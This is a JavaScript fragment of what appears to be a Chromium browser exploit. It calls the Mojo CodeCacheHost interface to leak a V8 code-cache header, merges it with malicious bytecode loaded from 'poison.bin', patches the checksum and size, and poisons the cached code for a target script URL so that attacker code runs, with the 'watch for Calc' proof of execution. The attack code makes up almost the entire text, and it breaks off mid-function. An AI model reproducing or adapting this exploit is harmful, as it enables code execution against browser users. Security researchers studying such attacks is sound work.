        const TARGET_URL = "https://linux-1723.github.io/test/exploit.js";
        const PAYLOAD_PATH = "poison.bin";

        // V8 Adler-32 Integrity Checksum
        function adler32(data) {
            let a = 1, b = 0;
            for (let i = 0; i < data.length; i++) {
                a = (a + data[i]) % 65521;
                b = (b + a) % 65521;
            }
            return (b << 16) | a;
        }

        async function pwn() {
            const status = document.getElementById('status');
            status.innerText = "Step 1: Fetching Poison...";

            // 1. Load your malicious bytecode
            const poisonResp = await fetch(PAYLOAD_PATH);
            const poisonBytecode = new Uint8Array(await poisonResp.arrayBuffer());

            // 2. Setup Mojo
            const pipe = Mojo.createMessagePipe();
            Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
            const host = pipe.handle0;

            // 3. THE HEIST: Request the legit header from the Browser
            status.innerText = "Step 2: Leaking V8 Header via Mojo...";
            
            // Increased buffer size to accommodate the larger 32-byte header
            const fetchMsg = new ArrayBuffer(120); 
            const fv = new DataView(fetchMsg);
            
            // Mojo Request Header (32 bytes)
            fv.setUint32(0, 32, true);  // Header Size (32 for requests)
            fv.setUint32(4, 1, true);   // Header Version (1)
            fv.setUint32(8, 0, true);   // Interface ID
            fv.setUint32(12, 3, true);  // Message ID: FetchCachedCode (3)
            fv.setUint32(16, 1, true);  // Flags: kMessageExpectsResponse (1) <-- THE FIX
            fv.setUint32(20, 0, true);  // Padding
            fv.setBigUint64(24, 1n, true); // Request ID: 1 (To catch the reply)

            // Params Struct (starts at offset 32)
            fv.setUint32(32, 24, true); // Struct size
            fv.setUint32(36, 0, true);  // Struct version
            fv.setUint32(40, 0, true);  // CodeCacheType kJavascript (0)
            fv.setUint32(44, 0, true);  // Padding
            fv.setBigUint64(48, 8n, true); // Offset to URL struct (points to 64)

            // URL Struct (starts at offset 64)
            fv.setUint32(64, 16, true); // Struct size
            fv.setUint32(68, 0, true);  // Struct version
            fv.setBigUint64(72, 8n, true); // Offset to String data (points to 88)

            // String Data (starts at offset 88)
            fv.setUint32(88, 8 + TARGET_URL.length, true); // String struct size
            fv.setUint32(92, TARGET_URL.length, true); // Num characters
            for(let i=0; i<TARGET_URL.length; i++) {
                fv.setUint8(96+i, TARGET_URL.charCodeAt(i));
            }
            
            host.writeMessage(fetchMsg, []);

            // 4. WATCHER: Listen for the Browser's Secret Reply
            const result = await host.readMessage();
            if (!result.handles || result.handles.length === 0) {
                status.innerText = "Failed to leak header. Ensure exploit.js was cached once.";
                return;
            }

            status.innerText = "Step 3: Patching Checksums...";
            const handle = result.handles[0];
            const sharedMem = handle.mapBuffer(0, 32);
            const legitHeader = new Uint8Array(sharedMem.buffer).slice(0, 32);

            // 5. THE FRANKENSTEIN: Merge Leaked Header + Poison Bytecode
            let finalPayload = new Uint8Array(32 + poisonBytecode.length);
            finalPayload.set(legitHeader, 0);
            finalPayload.set(poisonBytecode, 32);

            const pv = new DataView(finalPayload.buffer);
            pv.setUint32(20, poisonBytecode.length, true); // Update Size
            pv.setUint32(24, adler32(poisonBytecode), true); // Update Checksum

            // 6. RE-POISON: Push the patched cache back
            status.innerText = "Step 4: Poisoning Browser Cache...";
            const bufferSize = finalPayload.byteLength;
            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
            new Uint8Array(mapping.buffer).set(finalPayload);

            // Sync Time for the security check
            const targetResp = await fetch(TARGET_URL, {cache: "reload"});
            const jsTimeMs = new Date(targetResp.headers.get('date')).getTime();
            const chromeTime = BigInt(jsTimeMs + 11644473600000) * 1000n;

            // 184-byte DidGenerateCacheableMetadata message
            const msg = new ArrayBuffer(184);
            const v = new DataView(msg);
            v.setUint32(0, 24, true); v.setUint32(12, 1, true); // Message ID 1
            v.setUint32(24, 48, true); v.setBigUint64(40, 32n, true); v.setBigUint64(48, 96n, true);
            v.setUint32(56, 16, true); v.setUint32(60, 1, true); v.setBigUint64(64, 96n, true);
            v.setUint32(72, 16, true); v.setBigUint64(80, 8n, true);
            v.setUint32(88, 56, true); v.setUint32(92, TARGET_URL.length, true);
            for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
            v.setUint32(144, 16, true); v.setBigUint64(152, chromeTime, true);
            v.setUint32(160, 16, true); v.setUint32(168, 0, true); v.setUint32(172, bufferSize, true);

            host.writeMessage(msg, [sharedBuffer.handle]);

            // 7. DETONATE
            status.innerText = "Step 5: Detonating! Watch for Calc...";
            setTimeout(() => {

                s.src = TARGET_URL;
